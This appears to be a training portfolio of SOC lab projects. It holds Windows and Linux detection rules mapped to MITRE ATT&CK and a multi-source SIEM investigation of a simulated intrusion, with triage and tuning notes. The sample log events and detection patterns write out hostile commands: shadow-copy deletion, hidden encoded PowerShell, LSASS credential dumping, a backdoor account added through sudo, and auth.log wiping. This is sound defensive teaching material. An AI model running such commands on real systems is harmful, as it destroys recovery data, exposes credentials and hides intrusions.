soc.title: SOC Detection Lab
soc.desc: Create detection rules and map suspicious activities to MITRE ATT&CK.
steps: Set up an isolated lab environment (VMs only, no production systems)
Pick your log sources: Windows Event Logs and Sysmon on a test host
Write your first detection rule and test it against a simulated suspicious activity
Map the rule to a MITRE ATT&CK tactic and technique ID
Add at least 5 rules covering different ATT&CK tactics
Tune the rules: note false positives and how you reduced them
Write up the lab: problem, tools, findings, challenges, what you learned
Test each rule against its sample log event and confirm it fires (and does not fire on the benign control event)
Tune each rule: record the false positives you hit and the exclusion you added
Export the rule pack and write-up: this becomes the detection foundation Projects 2-4 build on

items.title: Brute force: repeated failed logons against one account
items.src: Windows Security Event Log (4625) / Sysmon
items.logic:
index=windows EventCode=4625 Logon_Type IN (2,3,10)
| bin _time span=5m
| stats count AS failures, dc(IpAddress) AS src_count BY _time, TargetUserName, IpAddress
| where failures >= 10
items.ev:
2026-11-20T14:02:11Z WIN-LAB01 Microsoft-Windows-Security-Auditing EventID=4625
Logon Type: 3 Account Name: jsmith Source Network Address: 192.168.56.44
Failure Reason: Unknown user name or bad password. (Status: 0xC000006D, Sub Status: 0xC000006A)
... repeated 14 times in 4 minutes from the same source IP, then stops.
items.triage:
1. Confirm the source IP: internal host, VPN gateway, or external?
2. Check for a following 4624 (success) for the same account/IP — success after failures = treat as compromise until cleared.
3. Ask the account owner / check password-change and lockout records.
4. Hunt the same source IP against other accounts (spray vs single-target brute force).
5. If malicious: disable the account, block the source at the firewall, force a password reset.
items.fp: Common FPs: user who forgot a changed password (fails cluster at start of day, then a helpdesk call), service accounts with a stale saved credential, and vulnerability scanners. Tune: exclude approved scanner IPs, raise the threshold for service accounts but alert on any success after failures.

items.title: Password spraying: one password tried across many accounts
items.src: Windows Security Event Log (4625) / Microsoft Entra ID sign-in logs
items.logic:
index=windows EventCode=4625
| bin _time span=10m
| stats dc(TargetUserName) AS accounts_targeted, count AS attempts BY _time, IpAddress
| where accounts_targeted >= 15 AND attempts < accounts_targeted * 3
items.ev:
2026-11-20T09:15:03Z DC-LAB01 EventID=4625 Account Name: a.patel Source: 203.0.113.87
2026-11-20T09:15:19Z DC-LAB01 EventID=4625 Account Name: m.chen   Source: 203.0.113.87
2026-11-20T09:15:41Z DC-LAB01 EventID=4625 Account Name: jsmith   Source: 203.0.113.87
... 22 distinct accounts in 9 minutes, 1-2 attempts each, no lockouts.
items.triage:
1. List every targeted account and check each for a later successful logon from the same source.
2. Check whether the source is a known VPN/proxy egress or an unfamiliar external IP.
3. Correlate with Entra ID / M365 sign-in logs for the same window.
4. If any account succeeded: escalate to incident, reset it, review its mailbox rules and sessions.
5. Block the source and consider tightening conditional access / MFA enforcement.
items.fp: Common FPs: a misconfigured app or mail client retrying many mailboxes through one gateway, and shared NAT/VPN egress making many users look like one source. Tune: allowlist known gateway IPs only when paired with a device/compliance signal; keep the distinct-account threshold, it is what separates spraying from one forgetful user.

items.title: PowerShell with encoded or hidden execution
items.src: Sysmon Event ID 1 (Process Create) / Windows PowerShell 4104
items.logic:
index=sysmon EventCode=1 Image="*\\powershell.exe"
 (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="* -w hidden*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-Expression*" OR CommandLine="*IEX*")
| table _time, Computer, User, ParentImage, CommandLine
items.ev:
2026-11-20T16:44:52Z WIN-LAB01 Sysmon EventID=1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -w hidden -enc aQBmACAAKABpAG4AdAAuAHAAcgBvAGMAZQBzAHMA...
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE User: LAB\jsmith
items.triage:
1. Decode the Base64 (UTF-16LE) payload offline and read what it actually does.
2. Identify the parent process: Office, a browser, or an installer changes the verdict completely.
3. Check Sysmon 3 (network) and 11 (file create) for the same process GUID in the next 5 minutes.
4. Isolate the host if the payload downloads or executes a second stage.
5. Collect the document/script that launched it as evidence before cleanup.
items.fp: Common FPs: legitimate admin scripts, SCCM/Intune deployments, and some installers use -EncodedCommand. Tune: allowlist by parent process + signer + known script hash, never by 'powershell is allowed'. A Word/Excel parent is almost never legitimate in this lab.

items.title: LSASS memory access: credential dumping attempt
items.src: Sysmon Event ID 10 (ProcessAccess)
items.logic:
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
 GrantedAccess IN ("0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff")
| where NOT SourceImage IN ("*\\MsMpEng.exe", "*\\csrss.exe", "*\\wininit.exe")
| table _time, Computer, SourceImage, CallTrace
items.ev:
2026-11-20T17:03:18Z WIN-LAB01 Sysmon EventID=10
SourceImage: C:\Users\jsmith\Downloads\mimi.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010 CallTrace: C:\Windows\SYSTEM32\ntdll.dll+...|C:\Users\jsmith\Downloads\mimi.exe+...
items.triage:
1. Treat as critical until disproven: LSASS access by a non-system binary is the Mimikatz pattern.
2. Isolate the host from the network immediately, keep it powered on for memory evidence.
3. Identify the account running the source process; assume its credentials and any credentials used on that host are exposed.
4. Force password resets for all accounts that logged onto the host, starting with admins.
5. Hunt fleet-wide for the same source binary hash.
items.fp: Rare FPs: some EDR/AV products and Windows Error Reporting touch LSASS. Tune by allowlisting signed security tooling by full path + publisher only. Never tune this rule down in severity to reduce noise; fix the allowlist instead. Enable Credential Guard / LSA protection (RunAsPPL) as the preventive pair to this detection.

items.title: Scheduled task created for persistence
items.src: Windows Security 4698 / Sysmon 1 (schtasks.exe) / TaskScheduler 106
items.logic:
index=windows (EventCode=4698 OR (EventCode=1 Image="*\\schtasks.exe" CommandLine="* /create *"))
| where NOT TaskName IN (known_good_tasks)
| table _time, Computer, User, TaskName, TaskContent
items.ev:
2026-11-20T18:21:07Z WIN-LAB01 EventID=4698 A scheduled task was created.
Task Name: \UpdateCheck User: LAB\jsmith
Task Content: <Actions><Exec> <Command>C:\Users\Public\upd.exe</Command></Exec></Actions>
Triggers: At log on + every 60 minutes
items.triage:
1. Read the task XML: what runs, from where, as whom, on what trigger?
2. A binary in Users\Public, AppData, Temp, or ProgramData is a strong malicious signal.
3. Check when the task was created against the user's other activity (was a suspicious process running just before?).
4. Hash the target binary and check it against your intel sources.
5. If malicious: disable (do not delete yet), preserve the XML and binary as evidence, then remove.
items.fp: Common FPs: software updaters (browsers, Adobe, collaboration tools) and IT deployment scripts create tasks constantly. Tune: maintain a known-good list by task name + target path + signer; alert hard on tasks pointing into user-writable folders regardless of name, attackers name tasks to blend in ('UpdateCheck', 'GoogleUpdate').

items.title: New account created or added to a privileged group
items.src: Windows Security 4720 (account created) / 4732 (added to security group)
items.logic:
index=windows EventCode IN (4720, 4732)
| where (EventCode=4732 AND GroupName IN ("Administrators", "Domain Admins", "Remote Desktop Users")) OR EventCode=4720
| table _time, Computer, SubjectUserName, TargetUserName, GroupName
items.ev:
2026-11-20T19:02:44Z DC-LAB01 EventID=4732 A member was added to a security-enabled local group.
Group: Administrators Member: LAB\svc_backup2 Added by: LAB\jsmith
Preceded 3 minutes earlier by EventID=4720 creating account 'svc_backup2'.
items.triage:
1. Who made the change, and is there a ticket / change record for it?
2. Was the creating account itself recently compromised (check Rules 1-4 hits for it)?
3. Check whether the new account has logged on, from where, and what it touched.
4. If unauthorized: disable the new account, remove the group membership, and treat the creator account as compromised.
5. Review all other changes by the same creator in the last 24h.
items.fp: Common FPs: helpdesk provisioning, onboarding, and break-glass admin use. Tune: correlate with your ticketing system where possible and suppress only when creator + business hours + ticket reference all line up. Never suppress 4720/4732 from service or non-IT accounts.

items.title: Remote execution via SMB admin shares (PsExec pattern)
items.src: Windows Security 5140/5145 (share access) / Sysmon 1 + Service Control Manager 7045
items.logic:
index=windows ((EventCode=5145 ShareName="*\\ADMIN$" RelativeTargetName="PSEXESVC.exe") OR EventCode=7045 ServiceFileName="*PSEXESVC*")
| table _time, Computer, IpAddress, SubjectUserName, ServiceName
items.ev:
2026-11-20T20:14:29Z WIN-LAB02 EventID=7045 A service was installed in the system.
Service Name: PSEXESVC Service File Name: %SystemRoot%\PSEXESVC.exe Start Type: demand start
Source workstation: WIN-LAB01 (192.168.56.10), account LAB\jsmith
items.triage:
1. Identify source host and account: is this an admin doing planned work?
2. Check the source host for compromise signals first; lateral movement usually means host one is already owned.
3. See what executed on the target after the service started (Sysmon 1, child processes).
4. Map every other host the same account touched in the window; that is your blast radius.
5. If unauthorized: isolate source and target, disable the account, remove the service.
items.fp: Common FPs: Sysinternals PsExec is also a legitimate admin tool, and some deployment/monitoring products use the same pattern. Tune: allowlist specific admin workstations + named admin accounts during change windows. The same event from a normal user workstation is an incident, not noise.

items.title: Shadow copy deletion: ransomware precursor
items.src: Sysmon Event ID 1 (Process Create) / Windows Security 4688
items.logic:
index=sysmon EventCode=1
 (Image="*\\vssadmin.exe" CommandLine="*delete shadows*")
 OR (Image="*\\wmic.exe" CommandLine="*shadowcopy delete*")
 OR (Image="*\\bcdedit.exe" (CommandLine="*recoveryenabled no*" OR CommandLine="*bootstatuspolicy ignoreallfailures*"))
 OR (Image="*\\wbadmin.exe" CommandLine="*delete*")
items.ev:
2026-11-20T21:37:55Z WIN-LAB01 Sysmon EventID=1
Image: C:\Windows\System32\vssadmin.exe
CommandLine: vssadmin.exe Delete Shadows /all /quiet
ParentImage: C:\Users\Public\upd.exe User: LAB\jsmith
items.triage:
1. Isolate the host immediately: this command usually runs seconds before mass encryption starts.
2. Kill the parent process tree and check for file-rename/encryption activity (Sysmon 11 bursts, extension changes).
3. Identify patient zero: how did the parent binary arrive (email, download, lateral movement)?
4. Check other hosts for the same parent binary before it fires there.
5. Do not reboot or wipe: preserve the disk for forensics (Project 7 picks this up).
items.fp: Very few legitimate FPs: backup software occasionally manages shadow copies, and admins resize shadow storage. Tune: allowlist your backup product's exact binary path and account. 'Delete Shadows /all /quiet' from a user-context process has no routine business justification.

items.title: Registry Run key persistence
items.src: Sysmon Event ID 13 (RegistryEvent SetValue)
items.logic:
index=sysmon EventCode=13
 TargetObject IN ("*\\CurrentVersion\\Run", "*\\CurrentVersion\\RunOnce", "*\\CurrentVersion\\Policies\\Explorer\\Run")
| where Details MATCH ("*AppData*", "*Temp*", "*Users\\Public*", "*ProgramData*")
| table _time, Computer, User, Image, TargetObject, Details
items.ev:
2026-11-20T18:21:09Z WIN-LAB01 Sysmon EventID=13 Registry value set
TargetObject: HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\UpdateCheck
Details: C:\Users\Public\upd.exe Image: C:\Users\Public\upd.exe
items.triage:
1. Resolve the value: which binary runs at every logon, and is it signed?
2. Correlate the timestamp: this often lands within seconds of a scheduled-task or service persistence attempt (same actor setting backups).
3. Check the binary's first-seen time and hash against intel.
4. If malicious: export the key for evidence, then remove the value and quarantine the binary.
5. Hunt the same value name and binary hash across all hosts.
items.fp: Common FPs: Teams, OneDrive, Spotify, and many updaters legitimately write Run keys, but they point into Program Files or their signed AppData install paths. The tuning key is the target path: Run keys pointing at Temp, Public, or unsigned ProgramData binaries stay alerted.

items.title: DNS tunneling: abnormally long or high-volume DNS queries
items.src: Sysmon Event ID 22 (DNSQuery) / DNS server query logs
items.logic:
index=sysmon EventCode=22
| eval qlen=len(QueryName)
| stats count AS queries, avg(qlen) AS avg_len, dc(QueryName) AS distinct_queries BY Computer, QueryName_parent_domain
| where queries > 500 OR (avg_len > 45 AND distinct_queries > 100)
items.ev:
2026-11-20T22:05:31Z WIN-LAB01 Sysmon EventID=22 DNS Query
QueryName: aGVsbG8td29ybGQtc2VjcmV0LWRhdGEtdGV4dA.tunnel.example.net QueryResults: 203.0.113.99
... 640 similar high-entropy subdomains for one parent domain in 15 minutes; baseline for the host is ~40 queries/hour.
items.triage:
1. Confirm the parent domain: newly registered, known tunneling service, or a domain the business uses?
2. Measure the volume and subdomain entropy against the host's baseline; tunneling is a pattern, not one query.
3. Identify the querying process (Sysmon 22 carries the Image) and whether it should ever do DNS itself.
4. Block the domain at DNS/firewall and sinkhole if your tooling allows.
5. Treat confirmed tunneling as exfiltration (T1048) until you can bound what left.
items.fp: Common FPs: DNS prefetching, CDN and anti-phishing services with long subdomains, DNS-over-HTTPS clients, and legitimate DNS-based software updates. Tune: baseline per host for a week before enforcing; allowlist known security/CDN domains. Keep the entropy + volume combination; length alone fires too often.

writeup.problem: A SOC analyst's core job is turning raw logs into reliable alerts. Project 1 builds that foundation: a small, high-quality detection rule pack for a Windows lab environment, where every rule maps to the MITRE ATT&CK behavior it catches, fires on a real sample event, and comes with the triage and tuning notes an analyst needs at 2 a.m. Without this, the later projects (SIEM investigation, threat hunting, ransomware) have nothing solid to stand on.
writeup.methodology: Lab: isolated Windows host (WIN-LAB01) and domain controller (DC-LAB01) on a host-only network, Sysmon (SwiftOnSecurity-style config) plus Windows Security auditing forwarded to a local SIEM. Method per rule: (1) pick the ATT&CK technique first, (2) find the log source that actually records it, (3) write the query in Splunk SPL / Sigma style, (4) generate the behavior safely in the lab (failed logons, schtasks, vssadmin in a snapshot VM), (5) confirm the rule fires on the sample event and stays quiet on a benign control event, (6) write triage steps and false-positive notes before calling the rule done. Tools: Sysmon, Windows Event Viewer, Splunk Free / Sigma notation, MITRE ATT&CK Navigator for coverage mapping.
writeup.findings: 10 rules shipped, covering 6 ATT&CK tactics: Credential Access (T1110.001 brute force, T1110.003 password spraying, T1003.001 LSASS access), Execution (T1059.001 encoded PowerShell), Persistence (T1053.005 scheduled task, T1136.001 new privileged account, T1547.001 Run key), Lateral Movement (T1021.002 PsExec/SMB admin shares), Impact (T1490 shadow copy deletion), and Command and Control (T1071.004 DNS tunneling). Two rules are critical severity (LSASS access, shadow copy deletion) because both sit minutes before major damage. In lab testing the rules chain together realistically: the same simulated intrusion fired the PowerShell rule, then Run key + scheduled task persistence within seconds, then the vssadmin rule, which is exactly the sequence a real ransomware intrusion follows.
writeup.challenges: Biggest challenge was false positives, not writing queries: PowerShell -EncodedCommand and Run keys are used constantly by legitimate software, so both rules needed path/signer/parent-process tuning instead of blanket alerting. LSASS access (Sysmon 10) needed a careful allowlist for AV/EDR or it cried wolf. DNS tunneling only works as a detection with a per-host baseline; a fixed threshold fired on normal CDN traffic. Limitation: this pack is Windows-endpoint only, thresholds are tuned to a small lab (they need re-baselining at real fleet scale), and nothing here detects fileless techniques that never touch the logged sources.
writeup.learned: Detection quality is mostly tuning and context, not clever queries: the same event is an incident or noise depending on parent process, binary path, signer, and what the account normally does. Mapping to ATT&CK first exposed coverage gaps honestly (nothing for Defense Evasion yet; that is a Project 4 hunting topic). Writing the triage steps and false-positive notes while building each rule, not after, is what makes a rule usable by someone else. This rule pack is the merged foundation: Project 2 investigates with these alerts, Project 3 extends the ransomware rules, and Project 4 hunts for what these rules miss.

soc.title: SIEM Log Investigation
soc.desc: Analyze Windows, Linux, and firewall logs to identify suspicious patterns.
steps: Collect sample Windows, Linux, and firewall logs into your SIEM
Build searches for failed logons, privilege changes, and odd hours
Pick one suspicious pattern and investigate it end to end
Write up the investigation: what you found and how you proved it
Normalize time across all three sources (UTC) and build one investigation timeline pivoted on source IP
Run each investigation pattern and save its result set with the IOC list (IPs, accounts, hosts, ports)
Correlate across sources: prove or clear each pattern with a second source before calling it an incident
Record the false positives for each query and the filter or baseline you added

items.title: Windows: failed logons followed by a success (brute force that worked)
items.src: Windows Security Event Log (4625 failed / 4624 success) via SIEM
items.logic:
index=windows (EventCode=4625 OR EventCode=4624) Computer=WIN-LAB01
| sort 0 _time
| streamstats count(eval(EventCode=4625)) AS fails_before BY TargetUserName, IpAddress reset_after=" (EventCode=4624)"
| where EventCode=4624 AND fails_before >= 5
| table _time, Computer, TargetUserName, IpAddress, Logon_Type, fails_before
items.ev:
2026-11-20T02:11:04Z WIN-LAB01 EventID=4625 Logon Type: 10 (RDP) Account: jsmith Source: 203.0.113.87 Failure: bad password
2026-11-20T02:11:19Z WIN-LAB01 EventID=4625 Account: jsmith Source: 203.0.113.87 (x11 more in 3 min)
2026-11-20T02:14:52Z WIN-LAB01 EventID=4624 Logon Type: 10 Account: jsmith Source: 203.0.113.87 — SUCCESS after 12 failures
Indicator: success from the same external IP that just failed 12 times, at 02:14, an hour this user never logs on.
items.triage:
1. Treat as compromise until cleared: a success after a failure burst is the single highest-value pattern in this project.
2. List everything jsmith did after 02:14 (4688 process starts, 5145 share access, Sysmon) and build the session timeline.
3. Check the same source IP in Linux and firewall logs (INV-02, INV-04, INV-07) — same actor usually tests every door.
4. Force a password reset, kill the RDP session, block 203.0.113.87 at the firewall.
5. Ask the user directly: were you logging in at 02:14 from that IP? No matching VPN record = confirmed incident.
items.fp: FPs: a user on a new device mistyping a changed password, then succeeding — but that comes from a known IP in working hours. The combination that matters is failures + success + unfamiliar source + odd hour. Tune: keep the alert, add context fields (known-IP? business hours?) instead of raising the threshold.

items.title: Linux: SSH brute force in auth.log
items.src: Linux /var/log/auth.log (sshd) on LINUX-LAB01 via SIEM
items.logic:
index=linux sourcetype=auth_log sshd "Failed password"
| rex "Failed password for (invalid user )?(?<user>\S+) from (?<src>\S+)"
| bin _time span=5m
| stats count AS fails, dc(user) AS users_tried, values(user) AS users BY _time, src
| where fails >= 10
items.ev:
Nov 20 02:03:11 linux-lab01 sshd[2214]: Failed password for invalid user admin from 203.0.113.87 port 51122 ssh2
Nov 20 02:03:14 linux-lab01 sshd[2216]: Failed password for invalid user oracle from 203.0.113.87 port 51140 ssh2
Nov 20 02:03:18 linux-lab01 sshd[2219]: Failed password for root from 203.0.113.87 port 51158 ssh2
... 47 failures in 4 minutes, cycling admin/oracle/root/ubuntu, then one 'Accepted password for deploy' at 02:07:44 from the same IP.
Indicators: 'invalid user' lines, root targeted, machine-speed intervals, same source IP as INV-01.
items.triage:
1. Search the same window for 'Accepted password' / 'session opened' from that source — INV-02 found one for the deploy account.
2. Check what deploy did after logon: sudo lines, new keys in ~/.ssh/authorized_keys, crontab changes.
3. Confirm deploy should never log in by password from the internet (key-only policy) — if so, this is a confirmed compromise.
4. Disable password auth for deploy, rotate its credentials and SSH keys, block the source IP.
5. Grep the full auth.log for the source IP across 7 days; brute forcers retry.
items.fp: FPs: monitoring/health-check accounts, a user with a stale key passphrase, and internet-wide background scanning (constant low-level SSH noise). Tune: alert on volume + an Accepted event, not on failures alone; baseline your real admin source IPs. Fail2ban-style auto-blocking reduces noise but does not replace the investigation.

items.title: Linux: sudo privilege escalation and sudoers change
items.src: Linux /var/log/auth.log (sudo) + /var/log/secure via SIEM
items.logic:
index=linux sourcetype=auth_log (sudo OR COMMAND)
| rex "(?<user>\S+) : TTY=.*COMMAND=(? <cmd>.*)"
| where cmd LIKE "%visudo%" OR cmd LIKE "%sudoers%" OR cmd LIKE "%useradd%" OR cmd LIKE "%usermod%" OR cmd LIKE "%passwd%" OR cmd LIKE "%/bin/bash%" OR cmd LIKE "%/bin/sh%"
| table _time, host, user, cmd
items.ev:
Nov 20 02:09:31 linux-lab01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/visudo
Nov 20 02:09:58 linux-lab01 sudo: deploy : COMMAND=/usr/sbin/useradd -m -s /bin/bash support2
Nov 20 02:10:12 linux-lab01 sudo: deploy : COMMAND=/usr/bin/passwd support2
Indicator: the account that was brute-forced in INV-02 edits sudoers and creates a new user 2 minutes after logon. That is persistence being installed, not admin work.
items.triage:
1. Diff /etc/sudoers and /etc/passwd against the last known-good snapshot: what exactly changed?
2. Check whether support2 has logged in, has an SSH key, or has a cron job.
3. Pull every sudo COMMAND line for deploy in the session, in order — it reconstructs the actor's hands on keyboard.
4. Remove the new account and sudoers entry, preserve copies as evidence first.
5. Treat deploy as fully compromised (see INV-02) and rebuild the host if the sudoers change cannot be fully accounted for.
items.fp: FPs: real admins do use sudo for user management. Context decides: change ticket, working hours, admin's normal host. A sudoers edit by a service/deploy account at 02:09 with no ticket has no benign reading. Tune: alert on the sensitive command set from non-admin accounts at any hour; from named admins, alert outside change windows.

items.title: Firewall: port scan — one source, many denied ports
items.src: Firewall logs (perimeter DENY/ALLOW) via SIEM
items.logic:
index=firewall action=DENY
| bin _time span=10m
| stats dc(dest_port) AS ports_probed, dc(dest_ip) AS hosts_probed, count AS hits BY _time, src_ip
| where ports_probed >= 20 OR hosts_probed >= 10
| sort - ports_probed
items.ev:
2026-11-20T01:58:02Z FW-EDGE DENY TCP 203.0.113.87:51423 -> 192.168.56.10:22
2026-11-20T01:58:02Z FW-EDGE DENY TCP 203.0.113.87:51424 -> 192.168.56.10:3389
2026-11-20T01:58:03Z FW-EDGE DENY TCP 203.0.113.87:51425 -> 192.168.56.10:445
... 38 distinct ports in 40 seconds against WIN-LAB01 and LINUX-LAB01, then the scan stops and INV-01/INV-02 logons begin 5 minutes later.
Indicators: sequential ports, sub-second timing, DENY verdicts, scan immediately before logon attacks.
items.triage:
1. Scope it: which hosts and ports were probed, and which ports answered (ALLOW or SYN-ACK in return traffic)? Open services are the follow-on targets.
2. Pivot the source IP into every other index (this is how INV-07 links the whole incident).
3. Check whether the scan is one-off internet background noise or targeted: background scans do not follow up with credential attacks 5 minutes later.
4. Block or geo-filter the source if the pattern is targeted; record the IOC for Project 5 enrichment.
5. Verify the probed open services (22, 3389) have logon monitoring from Project 1 in place.
items.fp: FPs: authorized vulnerability scanners (Project 11 will generate exactly this pattern), ISP probes, and misconfigured monitoring. Tune: allowlist your own scanner IPs by schedule; keep the distinct-port threshold, since single-port DENYs are constant internet noise and not worth an analyst's time alone.

items.title: Firewall: outbound beaconing to a rare external IP
items.src: Firewall logs (outbound ALLOW) + DNS query logs via SIEM
items.logic:
index=firewall action=ALLOW direction=outbound NOT dest_ip IN (known_update_nets)
| bin _time span=1h
| stats count AS sessions, avg(bytes_out) AS avg_bytes, dc(dest_port) AS ports BY src_ip, dest_ip, dest_port
| where sessions >= 20
| join dest_ip [ search index=dns | stats count AS dns_hits BY dest_ip ]
| where dns_hits < 3
items.ev:
2026-11-20T03:00:11Z FW-EDGE ALLOW TCP 192.168.56.10:49811 -> 198.51.100.23:8443 bytes_out=412
2026-11-20T03:05:11Z FW-EDGE ALLOW TCP 192.168.56.10:49890 -> 198.51.100.23:8443 bytes_out=398
2026-11-20T03:10:12Z FW-EDGE ALLOW TCP 192.168.56.10:49931 -> 198.51.100.23:8443 bytes_out=425
... every ~5 minutes for 3 hours from WIN-LAB01, tiny payloads, no matching DNS lookup (hard-coded IP).
Indicators: fixed interval (low jitter), small regular payloads, non-standard port 8443, destination seen nowhere else in the network.
items.triage:
1. Identify the process on the host making the connections (Sysmon Event 3 for the same window) — beaconing is a pattern, the process is the evidence.
2. Check first-seen: when did this destination first appear, and what happened on the host just before (here: 45 minutes after the INV-01 compromise).
3. Block the destination at the firewall and watch for the host trying alternates (failover C2).
4. Isolate the host if the process is unknown or unsigned; preserve a memory/disk image for Project 7.
5. Record dest IP, port, and interval as IOCs for Project 5 enrichment and fleet-wide hunting in Project 4.
items.fp: FPs: software update checks, telemetry, NTP, and monitoring agents also beacon on timers. They differ by having DNS lookups, known vendor destinations, signed processes, and fleet-wide presence (many hosts, not one). Tune: rarity is the signal — score destinations seen by only one host far higher than destinations seen by fifty.

items.title: Off-hours logons: valid accounts at the wrong time
items.src: Windows Security 4624 + Linux auth.log Accepted, correlated in SIEM
items.logic:
(index=windows EventCode=4624 Logon_Type IN (2,3,10)) OR (index=linux "Accepted password" OR "Accepted publickey")
| eval hour=strftime(_time, "%H")
| where hour >= 0 AND hour < 5
| stats count AS offhours_logons, values(host) AS hosts, values(src_ip) AS sources BY user
| where offhours_logons >= 1
items.ev:
2026-11-20T02:14:52Z WIN-LAB01 4624 jsmith from 203.0.113.87 (see INV-01)
2026-11-20T02:07:44Z linux-lab01 Accepted password for deploy from 203.0.113.87 (see INV-02)
2026-11-20T02:31:09Z WIN-LAB01 4624 LAB\svc_backup2 from 192.168.56.10 (internal, the account created during the Project 1 intrusion)
Baseline check: in the prior 30 days this lab had ZERO successful logons between 00:00 and 05:00.
Indicator: off-hours only proves something against a baseline. Here the baseline was empty, so every hit mattered.
items.triage:
1. Baseline first: pull 30 days and learn which accounts legitimately work nights (backups, batch jobs) before alerting anyone.
2. For each hit, check source and logon type: same user, new IP, new hour is the risky stack.
3. Correlate the account's actions inside the session, not just the logon itself.
4. Contact the account owner out-of-band for unexplained sessions.
5. Feed confirmed-bad sessions back into INV-07's timeline.
items.fp: FPs: scheduled tasks and backup service accounts, admins doing maintenance windows, and timezone bugs (logs in UTC vs local time is the classic trap — this lab normalizes everything to UTC first). Tune: allowlist service accounts by host + task, never by account alone; a service account interactively logging on (Type 2/10) at 02:31 is still an alert.

items.title: Cross-source correlation: one attacker IP across firewall, Windows, and Linux
items.src: Firewall + Windows Security + Linux auth.log, joined in SIEM on src_ip
items.logic:
index IN (firewall, windows, linux) src_ip=203.0.113.87 earliest=-24h
| sort 0 _time
| table _time, index, host, action_or_event, user, dest_port, result
/* The investigation query for the whole incident: one pivot value, three sources, one timeline. */
items.ev:
01:58 FW-EDGE DENY scan, 38 ports (INV-04)
02:03 linux-lab01 sshd Failed password x47 (INV-02)
02:07 linux-lab01 Accepted password for deploy (INV-02)
02:09 linux-lab01 sudo visudo + useradd support2 (INV-03)
02:11 WIN-LAB01 4625 failed logons x12 (INV-01)
02:14 WIN-LAB01 4624 SUCCESS jsmith via RDP (INV-01)
03:00 WIN-LAB01 outbound beaconing to 198.51.100.23:8443 begins (INV-05)
Indicators (the IOC list): src 203.0.113.87; accounts jsmith, deploy, support2, svc_backup2; hosts WIN-LAB01, LINUX-LAB01; C2 198.51.100.23:8443.
items.triage:
1. Build this single timeline before writing anything: every conclusion in the write-up must point at a line in it.
2. Mark the first malicious event (the 01:58 scan) and the first compromise (02:07 Linux) — dwell time and scope start there.
3. List every account and host the IP touched; anything on that list is in scope for credential resets.
4. Contain in order: block both IOC IPs at the firewall, disable support2 and svc_backup2, reset jsmith and deploy, isolate both hosts.
5. Hand the IOC list to Project 5 (enrichment) and the timeline to Project 7 (forensics) — that is the merge path.
items.fp: FP risk is low for a true three-source join, but shared NAT/VPN egress can make many legitimate users share one public IP. Verify with a second pivot (account, timing, behavior sequence) before declaring scope. In this lab the sequence scan -> brute force -> sudoers edit -> beaconing has no shared-NAT explanation.

items.title: Linux: log gap and tampering indicators
items.src: Linux auth.log / journald + SIEM ingestion health (event counts per host)
items.logic:
index=linux host=linux-lab01
| bin _time span=15m
| stats count AS events BY _time, host
| where events < 2
/* plus: */ index=linux ("logrotate" OR "truncate" OR "rm *auth.log*" OR "history -c" OR "journalctl --vacuum")
items.ev:
Nov 20 02:12:03 linux-lab01 systemd[1]: Started Daily apt download activities.
[NO auth.log events 02:12 -> 02:47 — baseline is 40-90 events per 15 min]
Nov 20 02:47:19 linux-lab01 sshd[3102]: Server listening on 0.0.0.0 port 22.
Shell history on the host later shows: history -c; > /var/log/auth.log; systemctl restart rsyslog
Indicator: a 35-minute hole that starts 3 minutes after the INV-03 sudoers change. Attackers clean up after persistence, and the cleanup itself leaves a shape.
items.triage:
1. Rule out the boring causes first: rsyslog crash, disk full, log rotation, SIEM forwarder outage (check ingestion from other hosts in the same window — here they were healthy).
2. Treat an unexplained gap on a compromised host as tampering: everything in the gap must be reconstructed from other sources (firewall, Windows, journald, shell history, file mtimes).
3. Check bash history files, journald persistence, and wtmp/lastlog for the gap window.
4. Forward logs off-host in real time from now on; local-only logs can always be edited by root.
5. Note the gap honestly in the write-up: what cannot be proven about 02:12-02:47 stays listed as unknown.
items.fp: FPs: log rotation at midnight, forwarder restarts during patching, and quiet periods on genuinely idle hosts. Tune: alert on gaps only for hosts with a known busy baseline, and pair the volume check with the tampering command search. Never tune this away on servers — silence from a chatty host is data.

writeup.problem: Project 1 proved single alerts can fire. Project 2 is the analyst's real daily work: given raw Windows, Linux, and firewall logs together in a SIEM, find the one real intrusion hiding inside thousands of normal events, prove it with evidence from more than one source, and say clearly what is still unknown. One log source alone would have missed or misjudged this incident: the firewall saw a scan, Windows saw failed logons, Linux saw a quiet sudoers edit. Only together do they tell the story.
writeup.methodology: Lab: the Project 1 hosts (WIN-LAB01, DC-LAB01) plus LINUX-LAB01 (Ubuntu, sshd + sudo logging) and a perimeter firewall (FW-EDGE), all forwarding to one SIEM (Splunk Free): Windows Security + Sysmon, /var/log/auth.log, and firewall DENY/ALLOW. Method: (1) normalize every source to UTC before searching anything, (2) baseline first (30 days of logon hours, event volumes, known scanner/admin IPs), (3) run the eight investigation patterns INV-01 to INV-08, (4) pivot on the shared values (source IP 203.0.113.87, then accounts) to join sources into one timeline (INV-07), (5) for every pattern, check the benign explanation before the malicious one and record the false positives. Tools: Splunk SPL, grep/awk for raw auth.log verification, MITRE ATT&CK for technique labels.
writeup.findings: One coordinated intrusion, reconstructed end to end. 01:58 the firewall logged a 38-port scan from 203.0.113.87 (INV-04). 02:03-02:07 the same IP brute-forced SSH on LINUX-LAB01 (47 failures) and got in as deploy (INV-02), then used sudo to edit sudoers and create account support2 (INV-03). 02:11-02:14 it brute-forced RDP on WIN-LAB01 and succeeded as jsmith after 12 failures (INV-01). Both compromises were off-hours against a baseline of zero night logons (INV-06). From 03:00 WIN-LAB01 beaconed every ~5 minutes to 198.51.100.23:8443 with no DNS lookup (INV-05). A 35-minute auth.log gap from 02:12 (INV-08) is assessed as log tampering. IOCs: IPs 203.0.113.87 and 198.51.100.23:8443; accounts jsmith, deploy, support2 (plus svc_backup2 from Project 1); hosts WIN-LAB01 and LINUX-LAB01. Containment: both IPs blocked, support2/svc_backup2 disabled, jsmith and deploy reset, both hosts isolated.
